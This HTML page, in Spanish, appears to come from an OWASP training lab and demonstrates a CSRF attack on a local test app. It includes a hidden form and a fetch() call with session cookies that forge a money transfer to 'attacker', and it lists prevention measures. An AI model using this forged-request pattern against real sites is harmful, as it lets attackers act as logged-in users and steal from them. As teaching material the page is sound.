<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CSRF Attack Demo</title>
  <link rel="stylesheet" href="styles.css">
</head>

<body>
  <div class="container">
    <header>
      <div class="warning-banner">
        <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
            d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
        </svg>
        <div>
          <h1>üé£ CSRF Attack Demo</h1>
          <p>Este sitio simula un ataque CSRF (Cross-Site Request Forgery)</p>
        </div>
      </div>
      <a href="index.html" class="back-link">‚Üê Volver al Dashboard</a>
    </header>

    <main>
      <div class="card">
        <h2>¬øQu√© es CSRF?</h2>
        <p>
          CSRF (Cross-Site Request Forgery) es un ataque que fuerza a un usuario autenticado
          a ejecutar acciones no deseadas en una aplicaci√≥n web donde est√° autenticado.
        </p>
      </div>

      <div class="card danger">
        <h2>Ataque Autom√°tico</h2>
        <p>
          Este formulario se env√≠a autom√°ticamente cuando cargas esta p√°gina.
          Si el usuario est√° autenticado en la aplicaci√≥n objetivo y no hay protecci√≥n CSRF,
          la acci√≥n se ejecutar√° sin su conocimiento.
        </p>

        <div class="code-block">
          <pre>&lt;form id="csrfForm" method="POST" action="http://localhost:3001/api/vulnerable/csrf/transfer-money"&gt;
    &lt;input type="hidden" name="toUser" value="attacker" /&gt;
    &lt;input type="hidden" name="amount" value="1000" /&gt;
&lt;/form&gt;

&lt;script&gt;
    // Auto-submit when page loads
    document.getElementById('csrfForm').submit();
&lt;/script&gt;</pre>
        </div>

        <form id="csrfForm" method="POST" action="http://localhost:3001/api/vulnerable/csrf/transfer-money">
          <input type="hidden" name="toUser" value="attacker" />
          <input type="hidden" name="amount" value="1000" />
        </form>

        <div id="status" class="status-box"></div>

        <button onclick="executeAttack()" class="btn btn-danger">
          Ejecutar Ataque Manualmente
        </button>
      </div>

      <div class="card success">
        <h2>‚úÖ C√≥mo Prevenir CSRF</h2>
        <ul>
          <li><strong>Tokens CSRF:</strong> Incluir un token √∫nico y aleatorio en cada formulario</li>
          <li><strong>SameSite Cookies:</strong> Usar atributo SameSite en cookies de sesi√≥n</li>
          <li><strong>Verificar Origin/Referer:</strong> Validar headers Origin o Referer</li>
          <li><strong>Re-autenticaci√≥n:</strong> Solicitar contrase√±a para acciones sensibles</li>
          <li><strong>Custom Headers:</strong> Requerir headers personalizados para APIs</li>
        </ul>
      </div>

      <div class="card info">
        <h3>‚ÑπÔ∏è Escenario del Ataque</h3>
        <ol>
          <li>El usuario est√° autenticado en http://localhost:3001</li>
          <li>El atacante enga√±a al usuario para visitar este sitio (http://localhost:3002)</li>
          <li>Este sitio env√≠a una petici√≥n autom√°tica a la aplicaci√≥n vulnerable</li>
          <li>El navegador incluye las cookies de sesi√≥n autom√°ticamente</li>
          <li>Si no hay protecci√≥n CSRF, la acci√≥n se ejecuta exitosamente</li>
        </ol>
      </div>
    </main>

    <footer>
      <p>OWASP Vulnerabilities Demo - CSRF Attack Simulation</p>
    </footer>
  </div>

  <script>
    function executeAttack() {
      const status = document.getElementById('status');
      status.innerHTML = '‚è≥ Enviando petici√≥n maliciosa...';
      status.className = 'status-box warning';

      // Send CSRF attack
      fetch('http://localhost:3001/api/vulnerable/csrf/transfer-money', {
        method: 'POST',
        credentials: 'include', // Important: includes cookies
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          toUser: 'attacker',
          amount: 1000
        })
      })
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            status.innerHTML = '‚úÖ ¬°Ataque exitoso! Se transfiri√≥ dinero sin el consentimiento del usuario.';
            status.className = 'status-box danger';
          } else {
            status.innerHTML = '‚ùå Ataque bloqueado: ' + (data.error || 'Protecci√≥n CSRF activa');
            status.className = 'status-box success';
          }
        })
        .catch(error => {
          status.innerHTML = '‚ö†Ô∏è Error: ' + error.message + ' (Verifica que el backend est√© corriendo)';
          status.className = 'status-box warning';
        });
    }

    // Uncomment to auto-execute on page load (dangerous!)
    // window.onload = executeAttack;
  </script>
</body>

</html>